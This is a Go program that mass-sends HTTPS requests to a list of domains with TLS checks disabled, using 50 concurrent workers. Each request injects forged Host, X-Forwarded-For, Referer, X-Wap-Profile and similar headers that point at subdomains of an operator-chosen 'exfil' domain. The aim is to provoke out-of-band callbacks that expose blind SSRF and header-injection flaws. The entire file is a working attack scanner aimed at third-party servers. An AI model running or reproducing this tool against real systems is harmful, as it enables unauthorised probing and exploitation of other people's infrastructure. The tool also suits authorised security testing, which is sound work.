package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/schollz/progressbar/v3"
)

// Number of concurrent workers to run
const numWorkers = 50

// Function to retrieve the domains from the domains file
func readDomains(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var domains []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		// Ignore empty lines and comments
		if line != "" && !strings.HasPrefix(line, "#") {
			domains = append(domains, line)
		}
	}

	return domains, scanner.Err()
}

// worker function processes domains from a channel
func worker(id int, wg *sync.WaitGroup, client *http.Client, domains <-chan string, exfilDomain string, bar *progressbar.ProgressBar) {
	defer wg.Done()

	for domain := range domains {
		// Construct the URL
		url := fmt.Sprintf("https://%s", domain)

		// Create a new request
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			log.Printf("Error creating request for %s: %v", domain, err)
			bar.Add(1)
			continue
		}

		// Add User Agent
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0")

		// Add Connection header
		req.Header.Set("Connection", "close")

		// Add Custom Headers for bounce
		req.Header.Set("Host", fmt.Sprintf("host.%s.%s", domain, exfilDomain))
		req.Header.Set("Origin", fmt.Sprintf("https://%s", domain))
		req.Header.Set("X-Forwarded-For", fmt.Sprintf("xff.%s.%s", domain, exfilDomain))
		req.Header.Set("X-Wap-Profile", fmt.Sprintf("wafp.%s.%s/wap.xml", domain, exfilDomain))
		req.Header.Set("Contact", fmt.Sprintf("root@contact.%s.%s", domain, exfilDomain))
		req.Header.Set("X-Real-IP", fmt.Sprintf("rip.%s.%s", domain, exfilDomain))
		req.Header.Set("True-Client-IP", fmt.Sprintf("trip.%s.%s", domain, exfilDomain))
		req.Header.Set("X-Client-IP", fmt.Sprintf("xclip.%s.%s", domain, exfilDomain))
		req.Header.Set("Forwarded", fmt.Sprintf("for=ff.%s.%s", domain, exfilDomain))
		req.Header.Set("X-Originating-IP", fmt.Sprintf("origip.%s.%s", domain, exfilDomain))
		req.Header.Set("Client-IP", fmt.Sprintf("clip.%s.%s", domain, exfilDomain))
		req.Header.Set("Referer", fmt.Sprintf("ref.%s.%s", domain, exfilDomain))
		req.Header.Set("From", fmt.Sprintf("root@from.%s.%s", domain, exfilDomain))

		// Make the request
		resp, err := client.Do(req)
		if err != nil {
			// log.Printf("Error making request to %s: %v", domain, err)
		} else {
			resp.Body.Close()
		}

		// Update progress bar
		bar.Add(1)
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: scanner <domains_file> <exfil_domain>")
		fmt.Println("Example: scanner domains.txt exfildomain.com")
		os.Exit(1)
	}

	domainsFile := os.Args[1]
	exfilDomain := os.Args[2]

	// Read the entries from the domains file
	domains, err := readDomains(domainsFile)
	if err != nil {
		log.Fatalf("Error reading domains file: %v", err)
	}
	if len(domains) == 0 {
		log.Fatalf("No domains found in %s", domainsFile)
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Allow insecure connections
		MaxIdleConns:        100,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	bar := progressbar.NewOptions(len(domains),
				      progressbar.OptionSetDescription("Scanning domains..."),
				      progressbar.OptionSetWriter(os.Stderr),
				      progressbar.OptionShowCount(),
				      progressbar.OptionShowIts(),
				      progressbar.OptionThrottle(65*time.Millisecond),
				      progressbar.OptionOnCompletion(func() {
					      fmt.Fprint(os.Stderr, "\n")
				      }),
				      progressbar.OptionSpinnerType(14),
				      progressbar.OptionFullWidth(),
	)

	// Set up a worker pool
	var wg sync.WaitGroup
	domainJobs := make(chan string, len(domains))

	// Start a fixed number of workers
	for w := 1; w <= numWorkers; w++ {
		wg.Add(1)
		go worker(w, &wg, client, domainJobs, exfilDomain, bar)
	}

	// Send jobs to the workers
	for _, domain := range domains {
		domainJobs <- domain
	}

	// Close the channel to signal that no more jobs will be sent
	close(domainJobs)

	// Wait for all workers to complete.
	wg.Wait()
	fmt.Println("Scan complete.")
}
